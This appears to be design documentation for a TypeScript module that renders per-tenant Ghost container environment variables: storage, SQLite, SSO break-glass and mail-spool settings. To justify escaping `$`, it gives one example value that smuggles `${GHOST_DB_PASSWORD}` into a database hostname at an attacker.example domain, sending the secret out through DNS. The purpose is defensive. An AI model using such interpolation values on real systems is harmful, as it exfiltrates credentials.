# environment.ts

## Tenant environment overview

The environment one tenant's Ghost container receives, split by where each
value is allowed to live: database and media become unions, and every
storage feature (`images`, `media`, `files`) renders the scanning decorator
rather than a bare `storage__active` / `storage__S3Storage__*` pair — see
`mediaEnvironment` below. SQLite emits `database__client=sqlite3` plus
`__connection__filename` and drops host, port, user, password and ssl; local
media wraps `Local*Storage` instead of `S3Storage` and drops both S3
secrets, per the descriptor's own safety posture rather than leaving it
unset.

Every secret-shaped value below is a `${VAR:?…}` reference into
`/etc/branchleft/<slug>.env` (a paying tenant) or nothing at all (a demo,
whose `sqlite`/`local` variants need no credential) — never a literal value.
`render()` never receives a real secret to begin with, so this module cannot
leak one even if it tried; the reference form is kept anyway so the rendered
Compose file is honest about what it needs supplied out of band.

`$` is escaped as `$$` in every raw descriptor-sourced string value. Compose
interpolates `$VAR`/`${VAR}` inside `environment:` values at
`docker compose config` / `up` time — nothing to do with this package's own
`yaml.ts`, which only serialises document text faithfully. A
validated-but-attacker-chosen value such as
`database.host: 'db.${GHOST_DB_PASSWORD}.attacker.example'` would otherwise
let Compose substitute a real secret into a value that leaves the container
in a DNS lookup. `required()`'s own `${VAR:?…}` output is the one
deliberate interpolation and is never escaped.

## Local storage boot guard

The image's own fail-closed boot guard (`docker-entrypoint.branchleft.sh`)
refuses `storage__images__adapter` unset, refuses any adapter that is not
the decorator outright, and checks the wrapped adapter's own required
fields through `storage__images__wraps` / `storage__images__wrappedConfig__*`
rather than trusting a bare adapter name — both read as "silently
non-durable, or silently unscanned, media" on the guard's assumption of an
ephemeral instance disk. A demo host's local disk is not that, so this
assumption does not hold for a demo, and this is the guard's own
documented, deliberate escape hatch: "local development / the SQLite smoke
test only". A demo is exactly that case.

## Media environment

`mediaBucketName`/`mediaPublicBaseUrl` re-derive the bucket and its public
URL from the slug rather than trusting `media.bucket` — the same isolation
control `media.ts` documents. `validateMediaBucket` throws first if a
descriptor's `bucket` disagrees, so this function never silently
substitutes one value for another.

Every storage feature (`images`, `media`, `files`) is rendered identically —
the decorator wrapping the local adapter for a demo, or `S3Storage` for a
tenant — because a mechanism that scanned only one feature, or only one
kind, would leave the others silently unprotected with every test for the
one it did cover green. The three features never diverge on which adapter
they wrap; only `STATIC_FILE_URL_PREFIX` differs between them, because
`S3Storage` does not infer its own URL segment from the feature it was
constructed for.

## Break-glass environment

The three `adapters__sso__BreakGlassSSO__*` keys `adapters/sso/README.md`
documents, plus `adapters__sso__active` itself — rendered only when
`validate()` has already accepted `breakGlass.kind = "enabled"` (which is
what proves the triple is complete and the image pin carries the adapter;
see `validate.ts#checkBreakGlassImageOrdering`). `disabled` renders no key
at all: an unset `adapters__sso__active` is exactly what makes Ghost fall
back to its own no-op adapter, never the empty string or a literal "false"
— either of those is itself one of the JSON-scalar traps
`assertNotJsonScalar` exists to catch on the other three keys.

## Bulk mail environment

The sending-identity keys `transport` cannot carry: `mail__from` — the env
var that looks like the address Ghost sends member mail from and is not,
kept identical to `settings.ts`'s `members_support_address` by construction
(both come from `mail.ts#renderSendingAddress`, never computed twice — see
that module's own doc comment for the trap this closes) — and, whenever
mail is enabled, the three keys that point Ghost's hardcoded Mailgun bulk
provider at the host's own spool instead of Mailgun itself: one mail spool
per host, serving both SMTP and the Mailgun-shaped API. Rendered from
`mail.enabled` and the sending identity alone — never from `transport.kind`
— so a demo (whose transactional path may be `queue`, carrying no host at
all) still gets a bulk path pointed at the spool; the two paths share a
spool, not a `TransportSpec` variant. The base URL is `spool.ts`'s
`MAIL_SPOOL_BASE_URL`, the spool's own service name and port, never a
caller-supplied address.

## Transport environment

`smtp` renders the host, port and user a caller supplies, with the password
as a `${GHOST_MAIL_PASSWORD:?…}` reference.

`queue` means the host's own mail spool (`spool.ts`). With mail enabled it
renders Ghost's SMTP transport pointed at the spool by name
(`MAIL_SPOOL_SERVICE`, `MAIL_SPOOL_SMTP_PORT`), never at a caller-supplied
address, so the address Ghost dials and the listener the spool renders come
from the same constants. The username is the tenant's sending domain, and the
password is the per-tenant key the bulk path already carries
(`GHOST_BULK_EMAIL_API_KEY`): the spool's SMTP front door checks a submitter
against the same key store as its Mailgun-shaped API. With mail disabled,
`queue` renders no transport at all, as before.

Member mail is addressed through a Ghost *setting*
(`members_support_address`, `settings.ts`), not through these keys.
